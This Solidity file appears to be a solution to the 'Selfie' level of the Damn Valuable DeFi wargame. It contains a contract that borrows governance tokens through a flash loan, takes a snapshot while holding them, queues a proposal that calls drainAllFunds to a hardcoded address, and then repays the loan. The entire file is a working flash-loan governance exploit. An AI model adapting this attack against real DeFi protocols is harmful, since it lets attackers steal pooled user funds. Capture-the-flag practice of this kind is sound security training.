// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {

    SelfiePool public immutable selfiePool;
    SimpleGovernance public immutable simpleGovernance;
    DamnValuableTokenSnapshot public immutable liquidityToken;
    address public owner;
    constructor(address selfiePoolAddress,address simpleGovernanceAddress,address liquidityTokenAddress) {
        selfiePool = SelfiePool(selfiePoolAddress);
        simpleGovernance = SimpleGovernance(simpleGovernanceAddress);
        liquidityToken=DamnValuableTokenSnapshot(liquidityTokenAddress);
        owner=msg.sender;
    }

    function flashLoan(uint256 amount) external {
        require(msg.sender==owner,"only owner can call");
        selfiePool.flashLoan(amount);
    }

    function receiveTokens(address tokenAddress,uint256 amount) external{
        
        require(tokenAddress==address(liquidityToken),"Error address");
        liquidityToken.snapshot();
        simpleGovernance.queueAction(address(selfiePool),abi.encodeWithSignature("drainAllFunds(address)", 0x70997970C51812dc3A010C7d01b50e0d17dc79C8),0);
        liquidityToken.transfer(address(selfiePool), amount);

    }
}